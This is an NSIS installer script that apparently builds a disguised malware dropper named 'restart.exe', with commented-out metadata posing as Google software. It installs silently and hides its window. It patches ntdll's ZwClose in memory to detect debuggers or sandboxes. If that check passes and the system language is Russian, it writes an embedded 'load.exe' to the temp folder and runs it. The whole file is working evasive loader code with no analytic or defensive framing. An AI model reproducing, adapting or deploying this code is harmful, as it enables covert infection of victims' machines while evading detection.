
Name "Load"

OutFile "restart.exe"

RequestExecutionLevel user
SilentInstall silent
ShowInstDetails show

SetCompressor /SOLID lzma

!include "LogicLib.nsh"

;LoadLanguageFile "${NSISDIR}\Contrib\Language files\English.nlf"
;  VIAddVersionKey /LANG=${LANG_ENGLISH} "CompanyName" "Google"
;  VIAddVersionKey /LANG=${LANG_ENGLISH} "FileDescription" "Google Company"
;  VIAddVersionKey /LANG=${LANG_ENGLISH} "FileVersion" "4.4.5"
;  VIAddVersionKey /LANG=${LANG_ENGLISH} "InternalName" ""
;  VIAddVersionKey /LANG=${LANG_ENGLISH} "LegalCopyright" "Copyright Google Company"
;  VIAddVersionKey /LANG=${LANG_ENGLISH} "OriginalFilename" ""
;  VIAddVersionKey /LANG=${LANG_ENGLISH} "PrivateBuild" ""
;  VIAddVersionKey /LANG=${LANG_ENGLISH} "ProductName" ""
;  VIProductVersion "4.0.5.2712"

!define SWP_NOSIZE	  0x0001
!define SWP_NOOWNERZORDER 0x0200

!define PAGE_EXECUTE_READWRITE 0x40

!define SW_HIDE 0x0
!define SW_SHOWNORMAL 1

!if ${DEBUG_MODE} != true
  AutoCloseWindow true
  Function ".onGUIInit"
  System::Call "User32::SetWindowPos(i, i, i, i, i, i, i) b ($HWNDPARENT, 0, -10000, -10000, 0, 0, ${SWP_NOOWNERZORDER}|${SWP_NOSIZE})"
  FunctionEnd
!endif

Section

SectionEnd

Section

SectionEnd

Section

!if ${DEBUG_MODE} != true
    HideWindow
!endif

System::Call "kernel32::GetModuleHandle(t 'ntdll.dll') p .r0"
System::Call "kernel32::GetProcAddress(p r0, t 'ZwClose') p .r2"
System::Call "kernel32::VirtualProtectEx(i 0xFFFFFFFF, p r2, i 0x1000, i ${PAGE_EXECUTE_READWRITE}, *i .r1) p .r0"
System::Alloc 6
pop $3
System::Call "ntdll::memcpy(p r3, p r2, i 6)"
System::Call "ntdll::memcpy(p r2, t '1ÀYZÿá', i 6)"
System::Call "kernel32::CloseHandle(i 0x12345678) p .r4"
System::Call "ntdll::memcpy(p r2, p r3, i 6)"
;System::Free $3

;System::Call "kernel32::VirtualProtect(p r2, i 0x1000, i r1, *i r1) p .r0"

${If} $4 == 1
    System::Call 'kernel32::GetSystemDefaultLangID()i.r0'
    IntOp $LANGUAGE $0 & 0xFFFF
    ${If} $LANGUAGE == 1049

        SetOutPath $TEMP
	File load.exe
	nsExec::Exec 'load.exe'

    ${EndIf}

${EndIf}

SectionEnd
